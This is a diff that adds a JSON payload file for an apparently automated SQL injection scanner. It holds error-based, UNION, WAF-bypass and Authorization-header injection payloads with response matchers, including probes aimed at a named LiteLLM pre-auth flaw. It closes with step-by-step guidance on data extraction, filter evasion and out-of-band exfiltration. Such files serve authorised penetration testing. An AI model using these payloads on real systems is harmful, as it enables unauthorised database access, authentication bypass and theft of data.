@@ -1,0 +1,397 @@
+{
+  "category": "sqli",
+  "description": " (core: error/union/generic/waf-bypass)",
+  "contexts": {
+    "error_based": {
+      "description": "Error-based SQL injection for explicit data extraction via database error messages",
+      "tech_match": [
+        "MySQL",
+        "MSSQL",
+        "Apache",
+        "PHP",
+        "IIS",
+        "ASP.NET"
+      ],
+      "param_match": [
+        "id",
+        "uid",
+        "pid",
+        "num",
+        "page",
+        "idx",
+        "index",
+        "cat",
+        "item_id",
+        "user_id",
+        "order_id"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}} AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
+          "description": "MySQL EXTRACTVALUE error-based extraction \u2014 XPATH syntax error leaks version() output",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "XPATH syntax",
+                "xpath syntax"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)-- -",
+          "description": "MySQL UPDATEXML error-based extraction \u2014 XPATH syntax error leaks current DB user",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "XPATH syntax",
+                "xpath syntax"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' AND 1=CONVERT(int,(SELECT DB_NAME()))--",
+          "description": "MSSQL CONVERT type mismatch error reveals current database name",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "conversion failed",
+                "Conversion failed"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "union_detect": {
+      "description": "UNION-based column count enumeration \u2014 determines number of columns by incrementing NULLs until query succeeds",
+      "tech_match": [],
+      "param_match": [
+        "id",
+        "uid",
+        "pid",
+        "num",
+        "page",
+        "idx",
+        "index",
+        "cat",
+        "item_id",
+        "user_id",
+        "order_id"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}} UNION SELECT NULL-- -",
+          "description": "Single-column UNION probe \u2014 status 200 or length diff indicates correct column count",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 35,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} UNION SELECT NULL,NULL-- -",
+          "description": "Two-column UNION probe \u2014 status 200 or length diff indicates correct column count",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 35,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} UNION SELECT NULL,NULL,NULL-- -",
+          "description": "Three-column UNION probe \u2014 status 200 or length diff indicates correct column count",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 35,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} ORDER BY 10-- -",
+          "description": "ORDER BY out-of-range column \u2014 500 error confirms fewer than 10 columns, revealing max column count",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 25,
+          "variables": {}
+        }
+      ]
+    },
+    "generic": {
+      "description": "Generic SQL injection probes for unknown or mixed database backends",
+      "tech_match": [],
+      "param_match": [
+        "id",
+        "uid",
+        "pid",
+        "num",
+        "page",
+        "idx",
+        "index",
+        "cat",
+        "item_id",
+        "user_id",
+        "order_id"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}}'",
+          "description": "Quote break to trigger generic SQL error \u2014 500 alone is weak; combined with SQL-related error keywords for higher confidence",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "sql",
+                "syntax",
+                "query",
+                "unterminated",
+                "quotation",
+                "mysql",
+                "postgres",
+                "oracle",
+                "sqlite",
+                "odbc",
+                "jdbc"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 35,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} OR 1=1--",
+          "description": "Classic OR 1=1 to expand result set",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 200
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {}
+        }
+      ]
+    },
+    "waf_bypass": {
+      "description": "WAF bypass SQL injection payloads \u2014 MySQL version comments, URL-encoded keywords from HackTricks",
+      "tech_match": [
+        "MySQL",
+        "Apache",
+        "PHP"
+      ],
+      "param_match": [
+        "id",
+        "uid",
+        "pid",
+        "num",
+        "page",
+        "idx",
+        "index",
+        "cat",
+        "item_id",
+        "user_id",
+        "order_id"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}}/*!50000UNION*//*!50000SELECT*/NULL-- -",
+          "description": "MySQL conditional version comment bypass \u2014 inline comments hide UNION/SELECT from WAF keyword matching",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' %55NION %53ELECT NULL-- -",
+          "description": "URL-encoded UNION SELECT (%55=U, %53=S) bypasses static keyword filters checking for literal strings",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}'/**/UNION/**/SELECT/**/NULL-- -",
+          "description": "Comment-padded UNION SELECT \u2014 C-style comments break keyword detection in many WAF implementations",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
+        }
+      ]
+    },
+    "auth_header_injection": {
+      "description": "SQLi via Authorization header. Many auth middleware concatenate Bearer-strip output into LIKE query without sanitisation.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Bearer AAAAAA'or'1'='1",
+          "description": "Authorization: Bearer with single-quote escape \u2014 confirms via error reflection",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "(?i)(SQL syntax|ORA-\\d{5}|syntax error at or near|near \\\")"
+            },
+            {
+              "type": "status",
+              "status": [
+                500,
+                200
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {
+            "header_inject": {
+              "Authorization": "Bearer AAAAAA'or'1'='1"
+            },
+            "manual_chain": true
+          }
+        }
+      ]
+    },
+    "litellm_pre_auth_header_injection_2026": {
+      "description": "LiteLLM pre-auth SQLi via Authorization header (CVE-2026-42208 class) \u2014 Bearer token interpolated into unparameterised SELECT for API-key lookup. Detect via PostgreSQL error marker or OR-injection echo.",
+      "tech_match": [
+        "LiteLLM"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Bearer ' OR (SELECT 1)=1--",
+          "description": "Authorization header SQLi \u2014 boolean-OR with parenthesised subselect to bypass simple filters",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "(?i)(pg_query|SQLSTATE|psycopg2|MySQLSyntaxError|sqlite3\\.OperationalError)"
+            },
+            {
+              "type": "status",
+              "status": [
+                200,
+                500
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {
+            "Authorization": "{{payload}}"
+          }
+        }
+      ]
+    }
+  },
+  "craft_guidance": [
+    "1. IDENTIFY CONTEXT: Determine if input lands in WHERE clause, ORDER BY, INSERT VALUES, or LIMIT. Each needs different break characters.",
+    "2. DETECT DB ENGINE: Use vendor-specific errors or functions \u2014 @@version (MSSQL), version() (MySQL/PG), sqlite_version() (SQLite), banner (Oracle).",
+    "3. CHOOSE TECHNIQUE by visibility: Error-based (fastest) > UNION (data extraction) > Boolean blind (slow but reliable) > Time-based (last resort) > OOB DNS (when no output at all).",
+    "4. UNION EXPLOITATION: Find column count with ORDER BY N (increment until error), then UNION SELECT NULL,NULL,...,NULL to match. Replace NULLs one-by-one with data extraction functions.",
+    "5. BLIND EXTRACTION: Use SUBSTRING(value,pos,1) with binary search on ASCII values. For time-based, calibrate delay against baseline latency (+2s minimum delta).",
+    "6. WAF BYPASS CHAIN: Try in order \u2014 inline comments (/*!50000 SELECT*/), case variation (sElEcT), whitespace alternatives (/**/ or %0a), double encoding (%2527), concat char-by-char (CHAR(83)+CHAR(69)...).",
+    "7. FILTER EVASION: If quotes blocked, use hex (0x61646D696E), CHAR(), or numeric comparison. If spaces blocked, use /**/ or %09 (tab). If keywords blocked, use synonyms (COALESCE vs IF, CASE vs IIF).",
+    "8. OOB EXFILTRATION: MySQL LOAD_FILE+INTO OUTFILE, MSSQL xp_dirtree/xp_fileexist to UNC path, PostgreSQL COPY TO PROGRAM, Oracle UTL_HTTP.REQUEST."
+  ]
+}
